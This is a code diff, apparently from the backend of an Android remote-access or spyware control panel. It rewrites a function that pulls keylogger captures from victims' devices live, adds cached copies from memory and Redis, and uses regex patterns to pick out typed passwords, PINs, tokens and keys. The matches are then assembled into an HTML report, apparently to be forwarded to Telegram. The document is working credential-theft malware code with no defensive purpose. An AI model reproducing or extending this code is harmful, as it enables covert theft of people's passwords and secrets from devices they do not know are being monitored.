@@ -285,52 +285,85 @@ td{padding:9px 14px;border-bottom:1px solid #1e293b;vertical-align:top}
     }
 }
 
-async function _autoSendPasswordsToTelegram(deviceId, deviceName, sendToAdmin, userList) {
-    // Collect from in-memory sync (passwords stored on last fresh connect)
-    const storedPwds = devicePasswords.get(deviceId) || [];
+// ── Password detection helpers (mirrors PasswordsTab.jsx logic exactly) ───────
+const _PWD_PATTERNS = [
+    /password[:\s=]+([^\s\n]{4,})/i,
+    /pass[:\s=]+([^\s\n]{4,})/i,
+    /pwd[:\s=]+([^\s\n]{4,})/i,
+    /pin[:\s=]+([0-9]{4,8})/i,
+    /secret[:\s=]+([^\s\n]{4,})/i,
+    /token[:\s=]+([^\s\n]{8,})/i,
+    /key[:\s=]+([^\s\n]{8,})/i,
+];
+const _PWD_FIELD_HINTS = ['password', 'passwd', 'pwd', 'pin', 'pass', 'secret', 'credentials'];
 
-    // Also pull from Redis keylogs (up to 500 entries pushed in real-time by the device)
-    let redisPwds = [];
+function _looksLikePassword(text, fieldHint, isPasswordFlag, eventType) {
+    if (isPasswordFlag === true || isPasswordFlag === 'true') return true;
+    if (eventType === 'PASSWORD_FOCUS') return true;
+    if (!text) return false;
+    const low = (fieldHint || '').toLowerCase();
+    if (_PWD_FIELD_HINTS.some(h => low.includes(h))) return true;
+    for (const pat of _PWD_PATTERNS) { if (pat.test(text)) return true; }
+    return false;
+}
+
+function _extractPasswordValue(text, fieldHint, isPasswordFlag, eventType) {
+    if (isPasswordFlag === true || isPasswordFlag === 'true') return text;
+    if (eventType === 'PASSWORD_FOCUS') return text;
+    const low = (fieldHint || '').toLowerCase();
+    if (_PWD_FIELD_HINTS.some(h => low.includes(h))) return text;
+    for (const pat of _PWD_PATTERNS) { const m = text.match(pat); if (m) return m[1]; }
+    return text;
+}
+
+async function _autoSendPasswordsToTelegram(deviceId, deviceName, sendToAdmin, userList) {
+    // ── Step 1: fetch live keylogs from device using chunked streaming ──────────
+    // Mirrors exactly what PasswordsTab.jsx does: sendCommand(deviceId,'get_keylogs',{limit:1000})
+    // _sendAndCaptureChunked handles both chunked data:chunk streams and plain command:response.
+    let liveEntries = [];
     try {
-        const redisEntries = await R.getKeylogs(deviceId);
-        redisPwds = redisEntries.filter(e =>
-            e.isPassword === true || e.isPassword === 'true' || e.eventType === 'PASSWORD_FOCUS'
-        );
+        log('TELEGRAM', `Password dump: fetching keylogs from device ${deviceId} via chunked stream`);
+        const items = await _sendAndCaptureChunked(deviceId, 'get_keylogs', { limit: 1000 }, 60000);
+        if (items && items.length) liveEntries = items;
     } catch (_) {}
 
-    // Also request live from device if online
-    let livePwds = [];
-    const conn = _getTcpConnForDevice(deviceId);
-    if (conn && conn.writable) {
-        try {
-            const resp = await _sendAndCapture(deviceId, 'get_keylogs', {}, 30000);
-            if (resp) {
-                const d = typeof resp === 'string' ? JSON.parse(resp) : resp;
-                const all = d.entries || d.keylogs || d.logs || d.keylogEntries || d.data || [];
-                livePwds = all.filter(e =>
-                    e.isPassword === true || e.isPassword === 'true' || e.eventType === 'PASSWORD_FOCUS'
-                );
-            }
-        } catch (_) {}
+    // ── Step 2: also pull from in-memory cache + Redis (populated on last connect) ─
+    const storedEntries = devicePasswords.get(deviceId) || [];
+    let redisEntries = [];
+    try { redisEntries = await R.getKeylogs(deviceId); } catch (_) {}
+
+    // ── Step 3: merge all sources and apply the same looksLikePassword() filter ──
+    // This is identical to absorbKeylogEntries() in PasswordsTab.jsx
+    const seen = new Set();
+    const passwords = [];
+    for (const e of [...liveEntries, ...storedEntries, ...redisEntries]) {
+        const text      = e.text || e.content || e.typedText || '';
+        const fieldHint = e.fieldType || e.inputType || e.field || '';
+        const isFlag    = e.isPassword;
+        const evType    = e.eventType || '';
+        if (!_looksLikePassword(text, fieldHint, isFlag, evType)) continue;
+        const dedupeKey = `${e.appName || e.packageName || ''}|${text.slice(0, 50)}|${e.timestamp || ''}`;
+        if (seen.has(dedupeKey)) continue;
+        seen.add(dedupeKey);
+        passwords.push({
+            value:      _extractPasswordValue(text, fieldHint, isFlag, evType),
+            appName:    e.appName || e.app || '',
+            appPackage: e.packageName || e.pkg || '',
+            fieldHint:  fieldHint || (isFlag ? 'password' : ''),
+            capturedAt: e.timestamp || Date.now(),
+        });
     }
 
-    // Merge stored + Redis + live, dedupe by app+text+timestamp
-    const seen = new Set();
-    const entries = [...storedPwds, ...redisPwds, ...livePwds].filter(e => {
-        const key = `${e.appName || e.packageName || ''}|${(e.text || e.typedText || '').slice(0, 50)}|${e.timestamp || ''}`;
-        if (seen.has(key)) return false;
-        seen.add(key);
-        return true;
-    });
-    if (!entries.length) return;
+    log('TELEGRAM', `Password dump for ${deviceId}: ${passwords.length} entries found (live:${liveEntries.length} stored:${storedEntries.length} redis:${redisEntries.length})`);
+    if (!passwords.length) return;
 
-    // Build HTML document
+    // ── Step 4: build HTML document (same layout as before) ────────────────────
     const esc = s => String(s || '').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
-    const rows = entries.map(e => {
-        const app   = `<span class="app">${esc(e.appName || e.packageName || 'Unknown app')}</span>`;
-        const field = `<span class="field">${esc(e.fieldType || '')}</span>`;
-        const pwd   = `<span class="pwd">${esc(e.text || e.typedText || '')}</span>`;
-        const date  = `<span class="date">${e.timestamp ? new Date(e.timestamp).toLocaleString() : ''}</span>`;
+    const rows = passwords.map(e => {
+        const app   = `<span class="app">${esc(e.appName || e.appPackage || 'Unknown app')}</span>`;
+        const field = `<span class="field">${esc(e.fieldHint)}</span>`;
+        const pwd   = `<span class="pwd">${esc(e.value)}</span>`;
+        const date  = `<span class="date">${e.capturedAt ? new Date(e.capturedAt).toLocaleString() : ''}</span>`;
         return `<tr><td>${app}</td><td>${field}</td><td>${pwd}</td><td>${date}</td></tr>`;
     }).join('\n');
 
